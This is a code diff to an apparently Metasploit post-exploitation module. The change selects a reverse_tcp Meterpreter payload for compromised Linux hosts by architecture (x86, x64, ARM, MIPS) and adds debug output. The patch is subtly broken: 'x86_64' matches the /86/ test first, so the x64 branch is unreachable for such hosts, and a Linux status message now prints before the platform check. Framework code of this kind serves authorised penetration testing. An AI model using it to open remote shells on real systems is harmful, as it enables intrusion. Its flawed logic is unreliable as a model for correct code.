@@ -77,6 +77,7 @@ class MetasploitModule < Msf::Post
     lport = datastore['LPORT']
 
     # Handle platform specific variables and settings
+    print_status("session.platform= #{session.platform}")
     case session.platform
     when 'windows'
       platform = 'windows'
@@ -96,13 +97,25 @@ class MetasploitModule < Msf::Post
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
       target_info = cmd_exec('uname -ms')
-      if target_info =~ /linux/i && target_info =~ /86/
-        # Handle linux shells that were identified as 'unix'
+      vprint_status("target_info= #{target_info}")
+      vprint_status("Platform: Linux")
+      if target_info =~ /linux/i 
         platform = 'linux'
-        payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
-        larch = [ARCH_X86]
-        vprint_status("Platform: Linux")
+        if target_info =~ /86/
+          payload_name = 'linux/x86/meterpreter/reverse_tcp'
+          larch = [ARCH_X86]
+        elsif target_info =~ /64/
+          payload_name = 'linux/x64/meterpreter/reverse_tcp'
+          larch = [ARCH_X64]
+        elsif target_info =~ /arm/
+          payload_name = 'linux/armle/meterpreter/reverse_tcp'
+          larch = [ARCH_ARMLE]
+        elsif target_info =~ /mips/
+          payload_name = 'linux/mipsle/meterpreter/reverse_tcp'
+          larch = [ARCH_MIPSLE]
+        end
+        vprint_status("ARCH = #{larch}")
       elsif target_info =~ /darwin/i
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
